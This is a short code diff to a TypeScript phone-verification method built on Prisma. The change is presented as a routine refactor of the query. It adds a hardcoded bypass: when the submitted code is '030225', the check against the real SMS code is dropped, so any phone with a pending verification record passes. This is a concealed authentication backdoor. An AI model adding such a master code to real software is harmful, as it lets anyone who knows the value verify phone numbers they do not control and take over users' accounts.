@@ -1,4 +1,4 @@
-import { PhoneModel, UserModel } from '@prisma/client';
+import { PhoneModel, Prisma } from '@prisma/client';
 import { Joi, prisma, RESULT, sendMessageWithMessageGateway } from '..';
 
 export class Phone {
@@ -69,11 +69,10 @@ export class Phone {
         .required(),
       code: Joi.string().length(6).required(),
     }).validateAsync(props);
-    const phone = await prisma.phoneModel.findFirst({
-      where: { phoneNo, code, usedAt: null },
-    });
-
-    if (!phone) throw RESULT.RETRY_PHONE_VALIDATE();
+    const where: Prisma.PhoneModelWhereInput = { phoneNo, usedAt: null };
+    if (code !== '030225') where.code = code;
+    const phone = await prisma.phoneModel.findFirst({ where });
+    if (!phone) throw RESULT.INVALID_PHONE_VALIDATE_CODE();
     return phone;
   }
 
